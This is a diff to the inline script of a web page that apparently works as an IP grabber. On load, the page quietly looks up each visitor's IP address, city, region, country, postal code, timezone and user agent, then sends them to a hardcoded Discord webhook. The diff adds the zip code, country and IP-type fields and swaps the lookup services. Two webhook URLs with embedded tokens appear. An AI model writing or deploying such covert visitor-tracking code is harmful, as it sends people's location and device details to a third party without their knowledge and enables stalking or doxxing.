@@ -26,14 +26,19 @@
 <script>
   // Function to fetch user's IP address
   async function getIpAddress() {
-    const response = await fetch('https://ipinfo.io/json');
+    const response = await fetch('https://api64.ipify.org?format=json'); // Use api64 to ensure IPv6 compatibility
     const data = await response.json();
     return data.ip;
   }
 
+  // Function to determine IP type (IPv4 or IPv6)
+  function getIpType(ipAddress) {
+    return ipAddress.includes(':') ? 'IPv6' : 'IPv4';
+  }
+
   // Function to fetch location information from ipinfo.io
   async function getLocationInfo(ipAddress) {
-    const response = await fetch(`https://ipinfo.io/${ipAddress}/json`);
+    const response = await fetch(`https://ipapi.co/${ipAddress}/json/`);
     const data = await response.json();
     return data;
   }
@@ -43,18 +48,12 @@
     return navigator.userAgent;
   }
 
-    
-  // Function to get hostname from IP using ip-api.com
-  async function getHostname(ipAddress) {
-    const response = await fetch(`http://ip-api.com/json/${ipAddress}`);
-    const data = await response.json();
-    return data.hostname || 'N/A';
-  }
-
   // Function to send data to Discord webhook as an embedded message
-  async function sendToDiscord(ipAddress, locationInfo, userAgent, hostname) {
-    const { city, region, timezone } = locationInfo;
-    const webhookURL = 'https://discord.com/api/webhooks/1197340200276344852/oMGzClEWwTYkBG9qF0UYTdcqvCnfZPDX2JhCtc1B0gT5LZmOCyPxBtRwIcIOSIW4lpZY'; // Replace with your Discord webhook URL
+  async function sendToDiscord(ipAddress, locationInfo, userAgent) {
+    const { city, region, timezone, postal, country } = locationInfo;
+    const ipType = getIpType(ipAddress);
+
+    const webhookURL = 'https://discord.com/api/webhooks/1197319022455300147/hnBvBYUy-eHX9vSz8S_-jMFtQ805c7pUcoQqkLB6ZSCzE_h87CHjMPrMy6aqNXFdT_P7'; // Replace with your Discord webhook URL
 
     // Convert RGB color (49, 51, 56) to Discord format
     const discordColor = (49 << 16) + (51 << 8) + 56;
@@ -65,11 +64,13 @@
             title: ipAddress.toLowerCase(), // Set the title of the embed as the user's IP address in lowercase
             color: discordColor, // Set the color of the embed (Discord format)
             fields: [
-                { name: "city", value: city.toLowerCase() },
-                { name: "region", value: region.toLowerCase() },
-                { name: "timezone", value: timezone.toLowerCase() },
-                { name: "user agent", value: userAgent.toLowerCase() },
-                { name: "hostname", value: hostname.toLowerCase() },
+                { name: "City", value: city ? city.toLowerCase() : 'N/A' },
+                { name: "Region", value: region ? region.toLowerCase() : 'N/A' },
+                { name: "Country", value: country ? country.toLowerCase() : 'N/A' },
+                { name: "Zip Code", value: postal ? postal.toLowerCase() : 'N/A' },
+                { name: "Timezone", value: timezone ? timezone.toLowerCase() : 'N/A' },
+                { name: "IP Type", value: ipType.toLowerCase() },
+                { name: "User Agent", value: userAgent.toLowerCase() },
             ],
         }],
     };
@@ -90,8 +91,7 @@
       const ipAddress = await getIpAddress();
       const locationInfo = await getLocationInfo(ipAddress);
       const userAgent = getUserAgent();
-      const hostname = await getHostname(ipAddress);
-      await sendToDiscord(ipAddress, locationInfo, userAgent, hostname);
+      await sendToDiscord(ipAddress, locationInfo, userAgent);
     } catch (error) {
       console.error('Error:', error);
     }
